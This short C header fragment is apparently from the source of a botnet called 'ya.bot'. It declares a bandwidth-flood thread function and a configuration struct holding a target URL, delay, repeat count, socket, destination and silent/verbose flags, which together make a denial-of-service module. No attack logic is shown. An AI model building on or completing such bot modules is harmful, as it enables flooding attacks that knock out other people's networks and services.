/*  ya.bot  */

#ifndef NO_BANDWITHFLOOD
DWORD WINAPI bandwithflood_main(LPVOID param);

typedef struct SBandwithFlood
{
	char m_szUrl[MEDBUF];
	int m_nDelay;
	int m_nTimes;
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SBandwithFlood;
#endif